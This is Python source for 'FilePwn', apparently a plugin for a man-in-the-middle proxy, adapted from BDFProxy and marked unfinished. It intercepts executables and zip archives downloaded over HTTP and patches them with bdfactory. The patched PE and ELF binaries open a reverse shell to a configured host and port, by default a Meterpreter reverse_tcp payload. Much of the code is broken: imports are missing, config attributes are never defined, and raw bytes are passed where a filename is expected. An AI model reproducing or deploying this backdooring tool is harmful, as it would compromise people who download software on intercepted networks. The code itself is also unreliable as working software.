################################################################################################
# 99.9999999% of this code is stolen from BDFProxy - https://github.com/secretsquirrel/BDFProxy
# 
# This is just a test to see if i can actually implement it correctly!! NOT THE FINAL VERSION!!!!
#################################################################################################

import sys, os
import pefile
import zipfile
from bdfactory import pebin, elfbin
from tempfile import mkstemp


# for now lets not read from a config file
#try:
    #from configobj import ConfigObj
#except:
    #sys.exit('[-] configobj not installed!')

class FilePwn(Plugin):
    name = "FilePwn"
    optname = "filepwn"
    implements = ["handleResponse"]
    has_opts = True
    log_level = logging.DEBUG
    desc = "Backdoor executables being sent over http using bdfactory (STILL WORK IN PROGRESS!!)"
    
    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''

        self.binaryMimeTypes = ["application/octet-stream", 'application/x-msdownload',
                                'application/x-msdos-program', 'binary/octet-stream']
        #FOR FUTURE USE
        self.zipMimeTypes = ['application/x-zip-compressed', 'application/zip']

        #USED NOW
        self.supportedBins = ('MZ', '7f454c46'.decode('hex'))
        
        self.options = options
        #userConfig = ConfigObj('bdfproxy.cfg')

    def binaryGrinder(self, binaryFile):
        """
        Feed potential binaries into this function,
        it will return the result PatchedBinary, False, or None
        """

        with open(binaryFile, 'r+b') as f:
            binaryTMPHandle = f.read()

        binaryHeader = binaryTMPHandle[:4]
        result = None

        try:
            if binaryHeader[:2] == 'MZ':  # PE/COFF
                pe = pefile.PE(data=binaryTMPHandle, fast_load=True)
                magic = pe.OPTIONAL_HEADER.Magic
                machineType = pe.FILE_HEADER.Machine

                #update when supporting more than one arch
                if (magic == int('20B', 16) and machineType == 0x8664 and
                   self.WindowsType.lower() in ['all', 'x64']):
                        add_section = False
                        cave_jumping = False
                        if self.WindowsIntelx64['PATCH_TYPE'].lower() == 'append':
                            add_section = True
                        elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
                            cave_jumping = True

                        targetFile = pebin.pebin(FILE=binaryFile,
                                                 OUTPUT=os.path.basename(binaryFile),
                                                 SHELL=self.WindowsIntelx64['SHELL'],
                                                 HOST=self.WindowsIntelx64['HOST'],
                                                 PORT=int(self.WindowsIntelx64['PORT']),
                                                 ADD_SECTION=add_section,
                                                 CAVE_JUMPING=cave_jumping,
                                                 IMAGE_TYPE=self.WindowsType,
                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx64['PATCH_DLL']),
                                                 SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx64['ZERO_CERT']),
                                                 )

                        result = targetFile.run_this()

                elif (machineType == 0x14c and
                      self.WindowsType.lower() in ['all', 'x86']):
                        add_section = False
                        cave_jumping = False
                        #add_section wins for cave_jumping
                        #default is single for BDF
                        if self.WindowsIntelx86['PATCH_TYPE'].lower() == 'append':
                            add_section = True
                        elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
                            cave_jumping = True

                        targetFile = pebin.pebin(FILE=binaryFile,
                                                 OUTPUT=os.path.basename(binaryFile),
                                                 SHELL=self.WindowsIntelx86['SHELL'],
                                                 HOST=self.WindowsIntelx86['HOST'],
                                                 PORT=int(self.WindowsIntelx86['PORT']),
                                                 ADD_SECTION=add_section,
                                                 CAVE_JUMPING=cave_jumping,
                                                 IMAGE_TYPE=self.WindowsType,
                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx86['PATCH_DLL']),
                                                 SUPPLIED_SHELLCODE=self.convert_to_Bool(self.WindowsIntelx86['SUPPLIED_SHELLCODE']),
                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx86['ZERO_CERT'])
                                                 )

                        result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') == '7f454c46':  # ELF

                targetFile = elfbin.elfbin(FILE=binaryFile, SUPPORT_CHECK=True)
                targetFile.support_check()

                if targetFile.class_type == 0x1:
                    #x86
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx86['SHELL'],
                                               HOST=self.LinuxIntelx86['HOST'],
                                               PORT=int(self.LinuxIntelx86['PORT']),
                                               SUPPLIED_SHELLCODE=self.convert_to_Bool(self.LinuxIntelx86['SUPPLIED_SHELLCODE']),
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()
                elif targetFile.class_type == 0x2:
                    #x64
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx64['SHELL'],
                                               HOST=self.LinuxIntelx64['HOST'],
                                               PORT=int(self.LinuxIntelx64['PORT']),
                                               SUPPLIED_SHELLCODE=self.convert_to_Bool(self.LinuxIntelx64['SUPPLIED_SHELLCODE']),
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()

            return result

        except Exception as e:
            print 'Exception', str(e)
            logging.warning("EXCEPTION IN binaryGrinder %s", str(e))
            return None
    
    def zip_files(self, aZipFile):
        "When called will unpack and edit a Zip File and return a zip file"

        print "[*] ZipFile size:", len(aZipFile) / 1024, 'KB'

        if len(aZipFile) > int(self.userConfig['ZIP']['maxSize']):
            print "[!] ZipFile over allowed size"
            logging.info("ZipFIle maxSize met %s", len(aZipFile))
            return aZipFile

        tmpRan = ''.join(random.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for _ in range(8))
        tmpDir = '/tmp/' + tmpRan
        tmpFile = '/tmp/' + tmpRan + '.zip'

        os.mkdir(tmpDir)

        with open(tmpFile, 'w') as f:
            f.write(aZipFile)

        zippyfile = zipfile.ZipFile(tmpFile, 'r')

        #encryption test
        try:
            zippyfile.testzip()

        except RuntimeError as e:
            if 'encrypted' in str(e):
                logging.info('Encrypted zipfile found. Not patching.')
                return aZipFile

        print "[*] ZipFile contents and info:"

        for info in zippyfile.infolist():
            print "\t", info.filename, info.date_time, info.file_size

        zippyfile.extractall(tmpDir)

        patchCount = 0

        for info in zippyfile.infolist():
            print "[*] >>> Next file in zipfile:", info.filename

            if os.path.isdir(tmpDir + '/' + info.filename) is True:
                print info.filename, 'is a directory'
                continue

            #Check against keywords
            keywordCheck = False

            if type(self.zipblacklist) is str:
                if self.zipblacklist.lower() in info.filename.lower():
                    keywordCheck = True

            else:
                for keyword in self.zipblacklist:
                    if keyword.lower() in info.filename.lower():
                        keywordCheck = True
                        continue

            if keywordCheck is True:
                print "[!] Zip blacklist enforced!"
                logging.info('Zip blacklist enforced on %s', info.filename)
                continue

            patchResult = self.binaryGrinder(tmpDir + '/' + info.filename)

            if patchResult:
                patchCount += 1
                file2 = "backdoored/" + os.path.basename(info.filename)
                print "[*] Patching complete, adding to zip file."
                shutil.copyfile(file2, tmpDir + '/' + info.filename)
                logging.info("%s in zip patched, adding to zipfile", info.filename)

            else:
                print "[!] Patching failed"
                logging.info("%s patching failed. Keeping original file in zip.", info.filename)

            print '-' * 10

            if patchCount >= int(self.userConfig['ZIP']['patchCount']):  # Make this a setting.
                logging.info("Met Zip config patchCount limit.")
                break

        zippyfile.close()

        zipResult = zipfile.ZipFile(tmpFile, 'w', zipfile.ZIP_DEFLATED)

        print "[*] Writing to zipfile:", tmpFile

        for base, dirs, files in os.walk(tmpDir):
            for afile in files:
                    filename = os.path.join(base, afile)
                    print '[*] Writing filename to zipfile:', filename.replace(tmpDir + '/', '')
                    zipResult.write(filename, arcname=filename.replace(tmpDir + '/', ''))

        zipResult.close()
        #clean up
        shutil.rmtree(tmpDir)

        with open(tmpFile, 'rb') as f:
            aZipFile = f.read()
        os.remove(tmpFile)

        return aZipFile
    
    def handleResponse(self,request,data):
        
        content_header = request.client.headers['Content-Type']

        if content_header in self.binaryMimeTypes:
            orig_binary = request.content.read()
            bd_binary = self.binaryGrinder(orig_binary)
            return {'request':request,'data':bd_binary}
        
        elif content_header in self.zipMimeTypes:
            orig_zipfile = request.content.read()
            bd_zip = self.zip_files(orig_zipfile) 
            return {'request':request,'data':bd_zip}
        
        else:
            return

    def add_options(self,options):
        options.add_argument("--msf-file-payload",type=str,default="windows/meterpreter/reverse_tcp",
                help="Payload you want to use (default: windows/meterpreter/reverse_tcp)")
